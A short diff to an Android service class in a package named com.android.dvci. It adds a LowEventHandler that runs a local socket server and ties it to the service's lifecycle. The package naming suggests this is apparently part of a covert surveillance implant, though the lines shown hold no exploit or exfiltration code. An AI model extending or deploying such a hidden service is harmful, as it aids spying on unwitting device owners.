@@ -16,6 +16,7 @@ import com.android.dvci.listener.BSm;
 import com.android.dvci.listener.BSt;
 import com.android.dvci.listener.WR;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.LowEventHandler;
 import com.android.mm.M;
 
 /**
@@ -33,8 +34,9 @@ public class ServiceMain extends Service {
     private Core core;
 
     public long mersenne;
+	private LowEventHandler lle;
 
-    @Override
+	@Override
     public IBinder onBind(Intent intent) {
         return null;
     }
@@ -62,7 +64,7 @@ public class ServiceMain extends Service {
         bsm = new BSm();
         bc = new BC();
         wr = new WR();
-
+	    lle = new LowEventHandler();
         if (Cfg.DEBUG) {
             Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
         }
@@ -195,6 +197,7 @@ public class ServiceMain extends Service {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (un-registering)");
 			}
+			lle.closeSocketServer();
 			unregisterReceiver(bst);
 			unregisterReceiver(bac);
 			unregisterReceiver(bsm);
